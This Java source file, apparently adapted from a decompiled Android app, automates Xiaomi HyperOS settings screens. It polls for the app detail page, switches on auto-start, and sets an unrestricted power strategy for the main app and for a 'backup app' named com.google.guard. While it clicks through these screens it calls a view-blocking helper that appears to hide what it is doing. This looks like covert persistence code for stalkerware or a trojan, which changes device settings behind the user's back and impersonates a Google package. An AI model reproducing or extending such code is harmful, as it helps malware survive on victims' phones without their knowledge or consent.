/**
 * 小米引擎调度任务 — XiaomiEngine 的 4 个 case 分发。
 *
 * vendor 原始类: o/p.java (96 行)
 * 4 switch cases:
 *   case 0: 初始保活窗口入口 (100s 定时器触发 Z())
 *   case 1: 轮询等待 App 详情窗口 → navigateAndSetPowerStrategy() 查找省电策略 → advanceStateMachine() 推进
 *   case 2: 自启动配置（主应用 + 备份应用）
 *   case 3: ADAPT — HyperOS 3 省电策略直达入口（跳过 navigateAndSetPowerStrategy()，直接 setUnrestrictedPowerStrategy() + advanceStateMachine()）
 */
package com.guard.wallet.delegate.task;

import com.guard.wallet.core.AppUtils;

import android.util.Log;
import java.util.concurrent.atomic.AtomicInteger;

public final class XiaomiDelegateTask implements Runnable {

    /** vendor a — dispatch case id */
    public final int a;

    /** vendor b — reference to XiaomiEngine */
    public final com.guard.wallet.engine.XiaomiEngine b;

    public XiaomiDelegateTask(com.guard.wallet.engine.XiaomiEngine qVar, int caseId) {
        this.a = caseId;
        this.b = qVar;
    }

    @Override
    public final void run() {
        int caseId = this.a;
        com.guard.wallet.engine.XiaomiEngine engine = this.b;

        switch (caseId) {
            case 0:
                /* Initial keepalive window entry */
                engine.Z();
                return;

            case 1:
                /* Poll loop: wait for app detail window, then autostart + power strategy */
                engine.getClass();
                try {
                    AtomicInteger counter = new AtomicInteger(0);
                    while (!engine.isInAppDetailWindow() && counter.incrementAndGet() < 20) {
                        com.guard.wallet.utils.SystemHelper.T0(1);
                    }

                    // ADAPT: HyperOS 3 在应用详情页内联了"自启动" Switch。
                    // 必须在 navigateAndSetPowerStrategy() 之前调用——后者会点击"省电策略"
                    // 离开应用详情页，之后就找不到内联 Switch 了。
                    if (engine.tryToggleInlineAutoStart()) {
                        engine.s.set(true);
                        Log.d("o.q", "HyperOS 3 内联自启动已完成，跳过自启动管理页");
                    }

                    engine.navigateAndSetPowerStrategy();
                    engine.advanceStateMachine();
                } catch (Exception ex) {
                    AppUtils.s("o.q", ex);
                }
                return;

            case 3:
                /* ADAPT: HyperOS 3 省电策略直达入口。
                 *
                 * 完整流程：
                 * 1. setUnrestrictedPowerStrategy() — 设"无限制"，末尾按返回回到首页
                 * 2. advanceStateMachine() — 检查 s，若 false 则打开应用详情页
                 * 3. 但 case 1 被占位阻止，应用详情页上没人操作
                 *
                 * 修复：在 advanceStateMachine() 之前，先打开应用详情页，
                 * 等待页面出现后执行 tryToggleInlineAutoStart()，然后再推进状态机。 */
                engine.getClass();
                try {
                    if (!engine.isInPowerStrategyWindow()) {
                        return;
                    }
                    Log.d("o.q", "HyperOS 3 省电策略直达: 已在省电策略窗口");
                    engine.setUnrestrictedPowerStrategy();

                    // 占位防止 case 1 重复触发
                    engine.n.add("keepAliveInAppDetail");

                    // k0() 按了返回键，现在可能在首页。
                    // 主动打开应用详情页，然后尝试内联自启动。
                    com.guard.wallet.utils.SystemHelper.Z0(
                            com.guard.wallet.MainApplication.getAppContext().getPackageName());
                    // 等待应用详情页加载
                    AtomicInteger waitCounter = new AtomicInteger(0);
                    while (!engine.isInAppDetailWindow() && waitCounter.incrementAndGet() < 10) {
                        com.guard.wallet.utils.SystemHelper.T0(1);
                    }

                    if (engine.tryToggleInlineAutoStart()) {
                        engine.s.set(true);
                        Log.d("o.q", "HyperOS 3 内联自启动已完成，跳过自启动管理页");
                    }

                    engine.advanceStateMachine();
                } catch (Exception ex) {
                    AppUtils.s("o.q", ex);
                }
                return;

            default:
                /* Auto-start config: enable auto-start for main app + backup app */
                engine.getClass();
                try {
                    if (!engine.isInAutoStartWindow()) {
                        return;
                    }

                    Log.d("o.q", "keepAliveInAutoStartManage 窗口匹配");
                    com.guard.wallet.helper.BlockViewManager.h(80);

                    /* Main app auto-start */
                    String mainAppLabel = com.guard.wallet.utils.SystemHelper.x0();
                    if (!AppUtils.B(mainAppLabel)) {
                        Log.d("o.q", "mainAppLabel:" + mainAppLabel);
                        if (engine.toggleAutoStart(mainAppLabel)) {
                            engine.s.set(true);
                            Log.d("o.q", mainAppLabel.concat(" 已开启自启动"));
                            com.guard.wallet.helper.BlockViewManager.h(90);
                        } else {
                            Log.e("o.q", mainAppLabel.concat(" 未开启自启动"));
                        }
                    }

                    /* Backup app auto-start (com.google.guard) */
                    String backupAppLabel = com.guard.wallet.utils.SystemHelper.e();
                    if (com.guard.wallet.utils.SystemHelper.d0("com.google.guard") != null) {
                        Log.d("o.q", "backupAppLabel:" + backupAppLabel);
                        if (engine.toggleAutoStart(backupAppLabel)) {
                            engine.t.set(true);
                            Log.d("o.q", backupAppLabel.concat(" 已开启自启动"));
                            com.guard.wallet.helper.BlockViewManager.h(90);
                        } else {
                            Log.e("o.q", backupAppLabel.concat(" 未开启自启动"));
                        }
                    }

                    engine.advanceStateMachine();
                } catch (Exception ex) {
                    AppUtils.s("o.q", ex);
                }
        }
    }
}
